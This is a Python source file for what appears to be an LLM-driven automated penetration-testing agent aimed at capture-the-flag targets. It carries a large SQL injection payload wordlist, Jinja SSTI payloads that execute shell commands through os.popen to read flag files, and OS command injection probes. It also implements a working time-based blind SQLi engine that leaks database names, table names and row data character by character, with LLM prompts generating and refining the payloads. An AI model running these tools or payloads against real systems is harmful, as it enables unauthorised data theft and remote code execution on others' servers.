# injection_tool.py - Smart Injection Framework (SQLi & Code Injection)
import asyncio
import json
import re
import shlex
import time
import random
from typing import Dict, List, Optional, Literal
from pydantic import BaseModel, Field
from langchain_core.tools import tool
from models.llm import llm
from tools.web_exploit_tool import _safe_run_remote, CurlHttpRequestTool
from prompts.prompt import DeepPentestPrompt

# ========== WORDLIST DEFINITION ==========
SMART_LOGIC_WORDLIST = [
  "'", "''", "')", "'(",
  "' OR 1=1 --", "' oR 1=1 --", "' Or 1=1#", "'OR 1=1--", "'OR/**/1=1--", "' OR (1=1) --", "' OR 2-1=1 --", "' OR 3*2=6 --",
  "' OR 1=2 --", "' OR 2=3 --", "' OR 'a'='b --", "' OR (1=2) --",
  "' OR '1'='1 --", "' OR '1'='1' --", "' OR 'a'='a --", "' OR 'a'='a' --", "' OR ''='' --",
  "' OR 'a'='a", "' OR 'a'='a'", "' OR '''=''' --", "' OR ''='",
  "' AND 1=1 --", "' AND 1=2 --", "' AND 'a'='a --", "' AND 'a'='b --",
  "' OR NOT 1=2 --", "' OR !(1=2) --", "' XOR 1=1 --",
  "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1 --", "' OR CASE WHEN 1=2 THEN 1 ELSE 0 END=1 --",
  "' OR 1<>2 --", "' OR 1!=2 --", "' OR 1<2 --", "' OR 2>1 --",
  "' OR 'a' LIKE 'a' --", "' OR 'a' LIKE '%' --",
  "' SELECT 1 --", "' SELeCT 1 --", "' SeLeCt 1 --", "' SELECT NULL --", "' SELECT 'a' --", "' SELECT",
  "' UNION SELECT 1 --", "' UNIon SELECT 1 --", "' uNIoN sELecT 1 --", "' UNION SELECT NULL --",
  "' UNION SELECT 1,2 --", "' UNION SELECT 1,2,3 --", "' UNION SELECT NULL,NULL --", "' UNION SELECT 'a',1 --",
  "' UN/**/ION SELECT 1 --", "' U/**/NION SELECT 1 --", "' UNION/**/SELECT/**/1 --",
  "' UNION SELECT 1 WHERE 1=1 --", "' UNION SELECT 1 WHERE 1=2 --",
  "' UNION SELECT 1 FROM dual --", "' UNION SELECT version() --",
  "' ORDER BY 1 --", "' ORdEr By 1 --", "' ORDER BY 100 --",
  "' GROUP BY 1 --", "' HAVING 1=1 --",
  "' OR LENGTH('a')=1 --", "' OR SUBSTR('abc',1,1)='a' --", "' OR ASCII('a')=97 --",
  "' OR SLEEP(1) --", "' OR pg_sleep(1) --",
  "' OR/**/1=1--", "' OR/*x*/1=1--", "' OR\t1=1--", "' OR\n1=1--",
  "' OR", "' AND", "' UNION", "' SELECT--", "';--",
]

FLAG_TOKEN_RE = re.compile(r"\b(?:FLAG|flag|XBEN)\{[^}\s]{1,200}\}", re.IGNORECASE)


def _extract_real_flag_token(text: str) -> str:
    if not text:
        return ""
    match = FLAG_TOKEN_RE.search(str(text))
    return match.group(0) if match else ""


def _extract_engine_hint_from_strategy(strategy: str) -> str:
    text = str(strategy or "").lower()
    if "django" in text:
        return "django"
    if "jinja" in text or "flask" in text:
        return "jinja"
    if "twig" in text:
        return "twig"
    return "unknown"


def _build_ssti_deterministic_payloads(engine_hint: str) -> list[tuple[str, str]]:
    payloads: list[tuple[str, str]] = []
    payloads.extend([
        ("{{flag}}", "context variable flag rendered directly"),
        ("{{ flag }}", "context variable flag rendered directly with spacing"),
    ])
    if engine_hint in {"jinja", "unknown"}:
        payloads.extend([
            ("{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}", "read flag.txt via config globals"),
            ("{{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}", "read flag.txt via cycler globals"),
            ("{{lipsum.__globals__['os'].popen('cat flag.txt').read()}}", "read flag.txt via lipsum globals"),
            ("{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}", "read /flag via config globals"),
            ("{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}", "read /flag via cycler globals"),
        ])
    return payloads


# ========== HELPER FUNCTIONS ==========

def _parse_smart_curl_output(output: str):
    """Parses output from CurlHttpRequestTool."""
    status = 0
    length = 0
    duration = 0.0
    headers = {}
    
    match_status = re.search(r'HTTP/[\d.]+ (\d+)', output)
    if match_status: status = int(match_status.group(1))
    
    parts = output.split('\r\n\r\n', 1)
    header_block = parts[0]
    header_lines = header_block.split('\n')
    for line in header_lines:
        if ':' in line:
            k, v = line.split(':', 1)
            headers[k.strip().lower()] = v.strip()

    body_content = ""
    if len(parts) > 1:
        body_content = parts[1]
        duration_match = re.search(r'Duration: ([\d.]+)s', body_content)
        if duration_match:
            duration = float(duration_match.group(1))
            body_content = body_content[:duration_match.start()].strip()
        length = len(body_content)
    
    return {"status": status, "length": length, "duration": duration, "headers": headers, "body": body_content}

async def _send_smart_injection(payload: str, url, method, body, body_type, headers, cookies, label="", baseline=None):
    """Execution with NO hardcoded duration thresholds."""
    injected_body = body.replace("INJECTION", payload)
    kwargs = {
        "url": url, "method": method, "headers": headers, "cookies": cookies,
        "is_time_based_injection": True, "include_headers": True
    }
    if headers:
        headers = {k: v for k, v in headers.items() if k.lower() != 'accept-encoding'}

    # For GET requests, CurlHttpRequestTool expects query_params dict, not raw_body
    if method.upper() == "GET":
        # Parse injected_body (format: "param1=value1&param2=value2") into dict
        from urllib.parse import parse_qs
        params_dict = {}
        for pair in injected_body.split("&"):
            if "=" in pair:
                key, value = pair.split("=", 1)
                params_dict[key] = value
        kwargs["query_params"] = params_dict
    elif body_type == "json":
        try:
            kwargs["body_type"] = "json"; kwargs["json_body"] = json.loads(injected_body)
        except:
            kwargs["body_type"] = "raw"; kwargs["raw_body"] = injected_body
    else:
        kwargs["body_type"] = "raw"; kwargs["raw_body"] = injected_body

    result_str = CurlHttpRequestTool.invoke(kwargs)
    parsed = _parse_smart_curl_output(result_str)
    
    sig = "NORMAL"
    if parsed["status"] == 500: sig = "⚠️ ENGINE REACHED"
    elif parsed["status"] in [301, 302, 303]: sig = "✅ REDIRECT"
    if sig == "NORMAL":
        if baseline:
            if parsed["status"] == baseline["status"] and abs(parsed["length"] - baseline["length"]) > 5:
                sig = "🚨 SUSPICIOUS"
    return parsed

# ========== TEMPLATE-BASED EXTRACTOR ==========

async def _run_template_extraction(base_payload: str, delay_substring: str, conditional_template: str, query: str, url, method, body, body_type, headers, cookies, confirmed_delay: float):
    """Performs binary search extraction using Agent-provided template."""
    print(f"\n⚡ [TEMPLATE EXTRACT] Query: {query}")
    print(f"   Base payload: {base_payload}")
    print(f"   Delay substring: {delay_substring}")
    print(f"   Template: {conditional_template}")
    
    # CRITICAL: Validate delay_substring exists in payload
    if delay_substring not in base_payload:
        print(f"   [!] ERROR: Delay substring '{delay_substring}' not found verbatim in payload. Aborting.")
        return ""
    
    # Use confirmed delay as threshold (with small margin)
    threshold = confirmed_delay * 0.8  # 80% of confirmed delay
    print(f"   [✓] Using threshold: {threshold:.3f}s (80% of confirmed {confirmed_delay:.3f}s)")
    
    
    # Binary search for length
    length = 0
    low, high = 0, 256
    while low <= high:
        mid = (low + high) // 2
        len_cond = f"LENGTH(({query}))>{mid}"
        len_template = conditional_template.replace("{COND}", len_cond)
        len_payload = base_payload.replace(delay_substring, len_template, 1)
        
        res = await _send_smart_injection(len_payload, url, method, body, body_type, headers, cookies, label=f"LenCheck mid={mid}")
        if res["duration"] >= threshold:
            low = mid + 1
        else:
            high = mid - 1
    
    length = low
    print(f"   [✓] Detected length: {length}")
    
    if length == 0:
        return ""
    
    result = ""
    for pos in range(1, length + 1):
        low = 32
        high = 126
        
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"
            test_template = conditional_template.replace("{COND}", cond)
            test_payload = base_payload.replace(delay_substring, test_template, 1)
            
            res = await _send_smart_injection(test_payload, url, method, body, body_type, headers, cookies, label=f"Pos{pos} mid={mid}")
            if res["duration"] >= threshold:
                low = mid + 1
            else:
                high = mid - 1
        
        char_code = low
        if 32 <= char_code <= 126:
            result += chr(char_code)
            print(f"      [+] Character {pos}/{length} found: '{chr(char_code)}' | Current: {result}")
        else:
            break
    
    return result


def _extract_template_block(text: str) -> str:
    match = re.search(r"<template>(.*?)</template>", text, flags=re.IGNORECASE | re.DOTALL)
    if not match:
        return ""
    return match.group(1).strip()


def _parse_time_template(template_block: str) -> Optional[Dict[str, str]]:
    """Parse a <template> block into {base_payload, delay_substring, conditional_template}.

    Expected format (flexible whitespace):
      BASE_PAYLOAD: ...
      DELAY_SUBSTRING: ...
      CONDITIONAL_REPLACEMENT: ...   (must contain {COND})
    """
    if not template_block:
        return None

    base_match = re.search(r"BASE_PAYLOAD\s*:\s*(.+)", template_block, flags=re.IGNORECASE)
    delay_match = re.search(r"DELAY_SUBSTRING\s*:\s*(.+)", template_block, flags=re.IGNORECASE)
    cond_match = re.search(r"CONDITIONAL_(?:REPLACEMENT|TEMPLATE)\s*:\s*(.+)", template_block, flags=re.IGNORECASE)

    if not base_match or not delay_match or not cond_match:
        return None

    base_payload = base_match.group(1).strip()
    delay_substring = delay_match.group(1).strip()
    conditional_template = cond_match.group(1).strip()

    if "{COND}" not in conditional_template:
        return None
    if not delay_substring or delay_substring not in base_payload:
        return None

    return {
        "base_payload": base_payload,
        "delay_substring": delay_substring,
        "conditional_template": conditional_template,
    }


async def _confirm_time_template_delay(
    time_template: Dict[str, str],
    url,
    method,
    body,
    body_type,
    headers,
    cookies,
    baseline_duration: float,
    min_extra_delay: float = 2.5,
):
    """Send base_payload once to verify it actually delays vs baseline."""
    res = await _send_smart_injection(
        time_template["base_payload"],
        url,
        method,
        body,
        body_type,
        headers,
        cookies,
        label="TemplateDelayCheck",
    )
    ok = res["duration"] >= (baseline_duration + min_extra_delay)
    return ok, res["duration"], res


async def _smart_sqli_timebased_engine(
    *,
    url: str,
    goal: str,
    method: str,
    body: str,
    body_type: str,
    headers,
    cookies,
    baseline_duration: float,
    seed_payload: str,
    max_phase_steps: int = 10,
):
    """LLM-driven phased time-based engine.

    Phases:
      1) Leak database name
      2) Leak table name
      3) Leak data from the table

    Each phase:
      - Ask LLM for a <template> block
      - Validate template by a single delay check
      - Attempt extraction (length + content via _run_template_extraction)
      - If length/extract fails, ask analyzer why and iterate (<= max_phase_steps)
    """

    state = {
        "database": None,
        "table": None,
        "artifacts": [],
        "time_template": None,
        "confirmed_delay": None,
        "seed_payload": seed_payload,
    }

    def _phase_header(name: str) -> str:
        return f"\n{'='*12} TIME-BASED PHASE: {name} {'='*12}\n"

    async def _gen_template(phase_name: str, phase_goal: str, analysis: str, known: Dict[str, Optional[str]]):
        prompt = f"""
You are a Time-based Blind SQLi TEMPLATE GENERATOR.

We already confirmed the target is vulnerable to time-based SQLi.

GLOBAL GOAL: {goal}
PHASE: {phase_name}
PHASE OBJECTIVE: {phase_goal}

Known context:
- seed_payload_that_delayed (do not assume it always works as-is): {known.get('seed_payload')}
- known_database: {known.get('database')}
- known_table: {known.get('table')}

Previous analysis (if any):
{analysis or 'NONE'}

TASK:
Output ONE reusable conditional-delay template in EXACT format below.
It must be compatible with the original injection context.

Requirements:
- BASE_PAYLOAD must be a FULL injection payload string that causes a noticeable delay.
- DELAY_SUBSTRING must be an EXACT substring inside BASE_PAYLOAD that causes the delay (e.g., SLEEP(5)).
- CONDITIONAL_REPLACEMENT must contain {{COND}} and must be a drop-in replacement for DELAY_SUBSTRING.
- Do NOT include explanations outside the <template> block.

Output format (STRICT):
<template>
BASE_PAYLOAD: <full payload>
DELAY_SUBSTRING: <exact substring>
CONDITIONAL_REPLACEMENT: <replacement containing {{COND}}>
</template>
"""
        return (await llm.ainvoke(prompt)).content

    async def _analyze_failure(phase_name: str, attempted_query: str, template_block: str, last_result: Dict, failure_reason: str):
        prompt = f"""
You are a Time-based Blind SQLi ANALYZER.

GLOBAL GOAL: {goal}
PHASE: {phase_name}
ATTEMPTED_QUERY: {attempted_query}

Template used:
<template>
{template_block}
</template>

Observed HTTP facts:
{json.dumps(last_result, ensure_ascii=False)}

Failure reason:
{failure_reason}

TASK:
Explain likely root cause briefly (filtering, syntax context mismatch, wrong quoting, DBMS mismatch, comment style, etc.)
and suggest how to adjust the NEXT template.

Keep it concise.
"""
        return (await llm.ainvoke(prompt)).content

    async def _phase_extract_fixed_query(phase_name: str, phase_goal: str, query: str) -> bool:
        analysis = ""
        print(_phase_header(phase_name))
        for step in range(1, max_phase_steps + 1):
            print(f"[Phase Step {step}/{max_phase_steps}] Generating template...")
            gen = await _gen_template(
                phase_name,
                phase_goal,
                analysis,
                {
                    "seed_payload": state["seed_payload"],
                    "database": state["database"],
                    "table": state["table"],
                },
            )
            block = _extract_template_block(gen)
            parsed = _parse_time_template(block)
            if not parsed:
                analysis = f"Template parse failed. LLM output was: {gen[:400]}"
                continue

            ok, confirmed_delay, delay_res = await _confirm_time_template_delay(
                parsed,
                url,
                method,
                body,
                body_type,
                headers,
                cookies,
                baseline_duration,
            )
            if not ok:
                analysis = await _analyze_failure(
                    phase_name,
                    query,
                    block,
                    delay_res,
                    "Base payload did not produce a delay (template not compatible / filtered / wrong DBMS / wrong context).",
                )
                continue

            # Adopt first working template for subsequent phases unless replaced
            state["time_template"] = parsed
            state["confirmed_delay"] = confirmed_delay

            extracted = await _run_template_extraction(
                parsed["base_payload"],
                parsed["delay_substring"],
                parsed["conditional_template"],
                query,
                url,
                method,
                body,
                body_type,
                headers,
                cookies,
                confirmed_delay=confirmed_delay,
            )
            if not extracted:
                analysis = await _analyze_failure(
                    phase_name,
                    query,
                    block,
                    delay_res,
                    "Extraction returned empty string (length not determined or content extraction failed).",
                )
                continue

            state["artifacts"].append({"phase": phase_name, "query": query, "value": extracted})
            return True

        # Phase failed
        state["artifacts"].append({"phase": phase_name, "query": query, "value": None, "error": analysis})
        return False

    async def _phase_data(phase_name: str, phase_goal: str) -> bool:
        analysis = ""
        print(_phase_header(phase_name))

        # Require DB + table to proceed
        if not state.get("database") or not state.get("table"):
            state["artifacts"].append({"phase": phase_name, "value": None, "error": "Missing database/table; cannot proceed."})
            return False

        for step in range(1, max_phase_steps + 1):
            prompt = f"""
You are a Time-based Blind SQLi QUERY PLANNER (no brute force).

GLOBAL GOAL: {goal}
PHASE: {phase_name}
PHASE OBJECTIVE: {phase_goal}

Known:
- database: {state['database']}
- table: {state['table']}

Previous analysis (if any):
{analysis or 'NONE'}

TASK:
Output EXACTLY ONE SQL query to extract ONE small artifact (<= 64 chars) that advances the goal.
Examples: first column name, a likely flag column value, a single row value.

Return only:
<query>SELECT ...</query>
"""
            q_resp = (await llm.ainvoke(prompt)).content
            q_match = re.search(r"<query>(.*?)</query>", q_resp, flags=re.IGNORECASE | re.DOTALL)
            if not q_match:
                analysis = f"Query parse failed. LLM output: {q_resp[:400]}"
                continue
            query = q_match.group(1).strip()

            # Ensure we have a working template; if not, force template generation
            if not state.get("time_template"):
                analysis = "No working time_template available yet."
                continue

            extracted = await _run_template_extraction(
                state["time_template"]["base_payload"],
                state["time_template"]["delay_substring"],
                state["time_template"]["conditional_template"],
                query,
                url,
                method,
                body,
                body_type,
                headers,
                cookies,
                confirmed_delay=state["confirmed_delay"] or (baseline_duration + 5.0),
            )
            if not extracted:
                analysis = f"Extraction empty for query: {query}"
                continue

            state["artifacts"].append({"phase": phase_name, "query": query, "value": extracted})
            # Heuristic stop if it looks like a flag
            if re.search(r"flag\{|FLAG\{|flag\[|FLAG\[", extracted):
                return True
            # Otherwise keep iterating (agent will propose next query)

        state["artifacts"].append({"phase": phase_name, "value": None, "error": analysis})
        return False

    # ===== Phase 1: Database name =====
    ok_db = await _phase_extract_fixed_query(
        "Leak database name",
        "Extract the current database/schema name.",
        "SELECT database()",
    )
    if not ok_db:
        return {
            "status": "failed",
            "reason": "Failed to leak database name",
            "artifacts": state["artifacts"],
        }

    state["database"] = next((a["value"] for a in state["artifacts"] if a.get("phase") == "Leak database name" and a.get("value")), None)

    # ===== Phase 2: Table name =====
    if state["database"]:
        table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{state['database']}' LIMIT 1"
    else:
        table_query = "SELECT table_name FROM information_schema.tables LIMIT 1"

    ok_table = await _phase_extract_fixed_query(
        "Leak table name",
        "Extract one table name from the target database.",
        table_query,
    )
    if not ok_table:
        return {
            "status": "partial",
            "database": state["database"],
            "reason": "Failed to leak table name",
            "artifacts": state["artifacts"],
        }

    state["table"] = next((a["value"] for a in state["artifacts"] if a.get("phase") == "Leak table name" and a.get("value")), None)

    # ===== Phase 3: Data =====
    ok_data = await _phase_data(
        "Leak data of the table",
        "Extract a small sensitive value from the table that advances the goal.",
    )

    return {
        "status": "ok" if ok_data else "partial",
        "database": state["database"],
        "table": state["table"],
        "artifacts": state["artifacts"],
    }

# ========== SMART SQLI TOOL ==========
class SmartSQLiInput(BaseModel):
    url: str = Field(..., description="Target URL")
    method: str = Field(default="GET", description="HTTP method (GET/POST)")
    body: str = Field(..., description="Request body with INJECTION placeholder (e.g., 'username=INJECTION&password=test')")
    goal: str = Field(..., description="Goal of the attack (e.g., 'Bypass login', 'Leak database name', 'Extract password')")
    body_type: str = Field(default="form", description="Body type: form, json, xml")
    max_attempts: int = Field(default=10, description="Maximum number of iterations")
    headers: Optional[Dict] = Field(default=None, description="Custom HTTP headers")
    cookies: Optional[Dict] = Field(default=None, description="HTTP cookies")

def check_flag(res):
    content = res.get("body", "")
    content = content+res.get("header","")
    if not content:
        return False

    # 🔥 1. Tìm pattern flag{...}
    flag_pattern = re.compile(r'flag\s*\{[^}]+\}', re.IGNORECASE)
    match = flag_pattern.search(content)
    if match:
        print(f"🏁 FLAG FOUND: {match.group(0)}")
        return True

    # 🔥 2. Tìm keyword flag (loose check)
    keyword_pattern = re.compile(r'\bflag\b', re.IGNORECASE)
    if keyword_pattern.search(content):
        print("🚩 Keyword 'flag' detected in response")
        return True

    return False

@tool(args_schema=SmartSQLiInput, return_direct=True)
async def SmartSQLiTool(url, goal, body, method="GET", body_type="form", max_attempts=10, headers=None, cookies=None):
    """SQLi Injection automation"""
    context = {
        "goal": goal,
        "baseline": {},
        "history": [],
        "is_blind": False,
        "extracted_database": None,
        "time_template": None,  # {base_payload, delay_substring, conditional_template, confirmed_delay}
    }

    print(f"\n🚀 SMART FORENSIC SQLI | Goal: {goal}")
    print("="*60)

    # [STEP 0] BASELINE (for probing reference only, not for time-based detection)
    context["baseline"] = await _send_smart_injection("benign", url, method, body, body_type, headers, cookies, label="Baseline")
    
    # [STEP 1-3] Probing (Removed redundant logs)
    print("\n[STEP 1-3] DIAGNOSTIC PROBING")
    uniform = True
    Data_Analyzer="There are some payload that different from baseline: \n"
    Ban_list="There are some payload that return status 500 when inject SQLi: "
    for p in SMART_LOGIC_WORDLIST: # Shorter initial probe
        res = await _send_smart_injection(p, url, method, body, body_type, headers, cookies, label="Probe", baseline=context["baseline"])
        if check_flag(res):
            return res
        if res["status"] == 500:
            Ban_list=Ban_list+f"{p}, "
        if res["status"] == 200:
            if(abs(res["length"] - context["baseline"]["length"]) > 5):
                Data_Analyzer=Data_Analyzer+f"When use payload:{p} the result is: {res}\n"
        if res["status"] != context["baseline"]["status"] or abs(res["length"] - context["baseline"]["length"]) > 5:
            uniform = False
    
    if uniform: context["is_blind"] = True; print("\n      [!] ALERT: Uniformity detected. Target likely BLIND.")
    mutation_results=Ban_list+"\n"+Data_Analyzer
    # [STEP 4] Strategy
    analyzer_prompt = DeepPentestPrompt.sqli_analyzer_prompt.format(
        goal=goal, baseline=json.dumps(context["baseline"]), quote_probes="{}", token_profile="None", mutation_results=mutation_results
    )
    if context["is_blind"]:
        analyzer_prompt += "\n### MANDATORY BLIND DISCOVERY\nFind a working TIME DELAY signal. Once confirmed, build a reusable conditional template for time-based extraction."
    
    context["current_strategy"] = (await llm.ainvoke(analyzer_prompt)).content
    print(f"\n--- Tactical Strategy ---\n{context['current_strategy']}\n")

    # [STEP 5] LOOP
    for i in range(max_attempts):
        print(f"\n--- Iteration {i+1}/{max_attempts} ---")
        
        gen_prompt = DeepPentestPrompt.sqli_generator_prompt.format(
            goal=goal, strategy=context["current_strategy"], history=json.dumps(context["history"][-3:])
        )
        if context["is_blind"]:
            if context.get("time_template") is None:
                gen_prompt += """
!!! CRITICAL BLIND SQLi RULES (PHASE 1: CONFIRM TIME DELAY) !!!
1. Your ONLY goal is to trigger a reliable TIME DELAY (SLEEP, BENCHMARK, etc.).
2. DO NOT try to bypass login or guess usernames/passwords.
3. DO NOT add unnecessary logic like 'username=admin'.
4. Use a minimal payload that clearly causes delay.
"""
            else:
                db = context.get("extracted_database")
                if db:
                    gen_prompt += f"""
!!! CRITICAL BLIND SQLi RULES (PHASE 2: EXTRACT DATA USING SAVED TEMPLATE) !!!
- A reusable conditional time-delay template is READY.
- Known database/schema name: {db}

Your task now:
1. Propose the NEXT best single SQL query to extract an artifact that advances the goal.
2. Output exactly one action of the form:
   [ACTION: TEMPLATE_EXTRACT(query="...")]

Rules:
- Do NOT ask to re-extract the database name again.
- Keep the query focused (one artifact per action).
"""
                else:
                    gen_prompt += """
!!! CRITICAL BLIND SQLi RULES (PHASE 2: BOOTSTRAP DB NAME) !!!
- A reusable conditional time-delay template is READY.
- Database/schema name is NOT known yet.

Output exactly one action:
   [ACTION: TEMPLATE_EXTRACT(query="SELECT database()")]
"""

        gen_resp = (await llm.ainvoke(gen_prompt)).content

        # Normalize agent output for reliable action parsing
        gen_resp_norm = gen_resp.strip()
        # Remove trivial wrapping quotes
        if (gen_resp_norm.startswith("'") and gen_resp_norm.endswith("'")) or (
            gen_resp_norm.startswith('"') and gen_resp_norm.endswith('"')
        ):
            gen_resp_norm = gen_resp_norm[1:-1].strip()
        # Pull content out of fenced blocks if present
        if "```" in gen_resp_norm:
            # Keep the last fenced block content (common pattern)
            try:
                gen_resp_norm = gen_resp_norm.split("```")[-2].strip()
            except Exception:
                pass
        
        # NOTE: Action-based TEMPLATE_EXTRACT/TIME_BLIND_EXTRACT flow removed.
        # Once time-based is detected, we delegate to the phased engine _smart_sqli_timebased_engine.

        # Normal Exploit Step
        try:
            gen_data = json.loads(gen_resp.strip().split("```json")[-1].split("```")[0])
            payload = gen_data["payload"]; expectation = gen_data["expectation"]
        except: payload = gen_resp.strip(); expectation = "Analyze"

        if context["is_blind"] and not payload.startswith("'"): payload = "'" + payload

        res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label="Exploit", baseline=context["baseline"])
        
        context["history"].append({"payload": payload, "status": res["status"], "length": res["length"], "duration": res["duration"], "body": res["body"], "expectation": expectation})

        # REFLECTION (Agent-Driven Detection)
        reflect_prompt = f"""
Goal: {goal}
Payload: {payload}
Your Expectation: {expectation}
Actual Result: Status {res['status']}, Duration {res['duration']}s, Length {res['length']}

CRITICAL ANTI-HALLUCINATION RULES:
1. Compare the ACTUAL RESULT against YOUR EXPECTATION.
2. Did the result match what you predicted?
   - If you expected a time delay and got one → <VERDICT>TIME_BASED_DETECTED</VERDICT>
   - If you expected a delay but got normal response time → <VERDICT>CONTINUE</VERDICT>
   - If the result doesn't match your expectation → <VERDICT>CONTINUE</VERDICT>
3. DO NOT hallucinate. Only declare TIME_BASED_DETECTED if the duration clearly shows the delay you predicted.

Analyze carefully.
"""
        reflection = (await llm.ainvoke(reflect_prompt)).content
        print(f"   [i] Analysis: {reflection}")

        if "<VERDICT>TIME_BASED_DETECTED</VERDICT>" in reflection.upper():
            print("\n🚨 [!] AGENT CONFIRMED TIME-BASED VULNERABILITY!")
            print(f"   [!] Analyzing payload structure: {payload}")
            context["is_blind"] = True
            
            # Check if payload is boolean-capable (can use IF/CASE)
            BOOLEAN_CAPABLE = any(x in payload.upper() for x in [" OR ", " AND ", "||", "&&"])
            
            if not BOOLEAN_CAPABLE:
                print("   [!] WARNING: Payload is NOT boolean-capable (no OR/AND/||/&&).")
                print("   [!] This is a Time-based DoS vector, not suitable for data extraction.")
                print("   [!] Marking as time-based vulnerability but skipping extraction.")
                context["current_strategy"] += "\nTime-based DoS confirmed (non-extractable)."
                continue
            
            # Delegate to phased time-based engine (no old loop/bruteforce behaviors)
            engine_result = await _smart_sqli_timebased_engine(
                url=url,
                goal=goal,
                method=method,
                body=body,
                body_type=body_type,
                headers=headers,
                cookies=cookies,
                baseline_duration=context["baseline"].get("duration", 0.0),
                seed_payload=payload,
                max_phase_steps=10,
            )
            return engine_result

        if "<VERDICT>SUCCESS</VERDICT>" in reflection.upper() and res["status"] != 500:
            print(f"\n🎯 GOAL REACHED!"); return f"✅ SUCCESS: {goal}"

    return "Max iterations reached."

class SmartCodeInjectionInput(BaseModel):
    url: str = Field(..., description="Target URL")
    method: str = Field(default="GET", description="HTTP method (GET/POST)")
    body: str = Field(..., description="Request body with INJECTION placeholder marking the vulnerable parameter (e.g., 'cmd=INJECTION&param=value', 'input=INJECTION&param=value', 'file=INJECTION&param=value')")
    baseline: str = Field(..., description="Baseline/normal payload to test first for establishing reference behavior (e.g., '127.0.0.1' for ping, 'test.txt' for file operations, 'hello' for SSTI)")
    attack_type: str = Field(default="OS_Command_Linux", description="Attack type: OS_Command_Linux or SSTI")
    body_type: str = Field(default="form", description="Body type: form, json, xml")
    headers: Optional[Dict] = Field(default=None, description="Custom HTTP headers")
    cookies: Optional[Dict] = Field(default=None, description="HTTP cookies")

@tool(args_schema=SmartCodeInjectionInput, return_direct=True)
async def SmartCodeInjectionTool(url, body, baseline, method="GET", attack_type="OS_Command_Linux", body_type="form", headers=None, cookies=None):
    """Forensic Code Injection tool. Tests for OS Command Injection (Linux) and Server-Side Template Injection (SSTI) vulnerabilities. Agent-driven detection with automatic payload generation and result analysis."""
    if attack_type == "OS_Command_Linux":
        return await OSCommandInjectionTool(url, body, baseline, method, body_type, headers, cookies)
    elif attack_type == "SSTI":
        return await SSTITool(url, body, baseline, method, body_type, headers, cookies)
    return "Invalid attack_type specified. Use 'OS_Command_Linux' or 'SSTI'."

# ========== OS COMMAND INJECTION TOOL ==========

async def OSCommandInjectionTool(url, body, baseline, method="GET", body_type="form", headers=None, cookies=None, max_attempts=20):
    """OS Command Injection (Linux) detection and exploitation tool with reflection."""
    goal = "Retrieve flag"
    context = {"baseline_value": baseline, "baseline": {}, "history": [], "goal": goal, "confirmed_vuln": False}
    
    print(f"\n🚀 OS COMMAND INJECTION (Linux) | Goal: {goal} | Baseline: {baseline}")
    print("="*60)
    
    # [STEP 0] BASELINE - Test with normal input
    print("\n[STEP 0] BASELINE TEST")
    context["baseline"] = await _send_smart_injection(baseline, url, method, body, body_type, headers, cookies, label="Baseline")
    
    # [STEP 1] PROBING - Test basic command injection payloads
    print("\n[STEP 1] COMMAND INJECTION PROBING")
    probe_payloads = [
        f"{baseline};echo test",
        f"{baseline}|echo test",
        f"{baseline}`echo test`",
        f"{baseline}$(echo test)",
        f"{baseline};sleep 3",
        f"{baseline}|sleep 3",
        f"{baseline}`sleep 3`",
        f"{baseline}$(sleep 3)",
    ]
    
    probe_results = []
    for payload in probe_payloads:
        res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label="Probe")
        probe_results.append({
            "payload": payload,
            "status": res["status"],
            "length": res["length"],
            "duration": res["duration"],
            "body": res["body"]
        })
        context["history"].append(probe_results[-1])
        
        # Check for time-based detection
        if res["duration"] > context["baseline"]["duration"] + 2.5:
            print(f"\n⚠️ TIME-BASED COMMAND INJECTION DETECTED!")
            print(f"   Payload: {payload}")
            print(f"   Duration: {res['duration']}s vs Baseline: {context['baseline']['duration']}s")
            context["confirmed_vuln"] = True
            context["injection_type"] = "time-based"
            break
        
        # Check for output-based detection
        if res["status"] == 200 and "test" in res["body"].lower():
            print(f"\n⚠️ OUTPUT-BASED COMMAND INJECTION DETECTED!")
            print(f"   Payload: {payload}")
            print(f"   Response contains 'test' keyword")
            context["confirmed_vuln"] = True
            context["injection_type"] = "output-based"
            break
    
    if not context["confirmed_vuln"]:
        return "❌ No OS Command Injection vulnerability detected in initial probing."
    
    # [STEP 2] ANALYZER - Get strategy from LLM
    print("\n[STEP 2] STRATEGIC ANALYSIS")
    analyzer_prompt = DeepPentestPrompt.os_command_analyzer_prompt.format(
        goal=goal,
        baseline=json.dumps(context["baseline"]),
        probe_results=json.dumps(probe_results)
    )
    
    strategy = (await llm.ainvoke(analyzer_prompt)).content
    print(f"--- Strategy ---\n{strategy}\n")
    context["current_strategy"] = strategy

    # [STEP 2.5] DETERMINISTIC IMMEDIATE-SINK FALLBACKS
    print("\n[STEP 2.5] DETERMINISTIC SSTI FALLBACKS")
    engine_hint = _extract_engine_hint_from_strategy(strategy)
    for payload, expectation in _build_ssti_deterministic_payloads(engine_hint):
        res = await _send_smart_injection(payload, url, method, body, body_type, headers, cookies, label="Deterministic")
        context["history"].append({
            "payload": payload,
            "status": res["status"],
            "length": res["length"],
            "duration": res["duration"],
            "body": res["body"],
            "expectation": expectation
        })
        response_flag = _extract_real_flag_token(res["body"])
        if response_flag:
            print(f"\n🎯 GOAL REACHED! Deterministic payload succeeded: {payload}")
            return f"✅ SUCCESS: {goal}\nPayload: {payload}\nResponse: {res['body']}"

    # [STEP 3] REFLECTION LOOP - Generate and test payloads
    print("\n[STEP 3] EXPLOITATION LOOP")
    for i in range(max_attempts):
        print(f"\n--- Iteration {i+1}/{max_attempts} ---")
        
        # Generate next payload
        gen_prompt = DeepPentestPrompt.os_command_generator_prompt.format(
            goal=goal,
            strategy=context["current_strategy"],
            history=json.dumps(context["history"][-3:]),
            baseline=json.dumps(context["baseline"])
        )
        
        gen_resp = (await llm.ainvoke(gen_prompt)).content
        
        # Parse JSON response
        try:
            gen_data = json.loads(gen_resp.strip().split("```json")[-1].split("```")[0])
            payload = gen_data["payload"]
            expectation = gen_data["expectation"]
        except:
            payload = gen_resp.strip()
            expectation = "Analyze response"
        
        # Execute payload
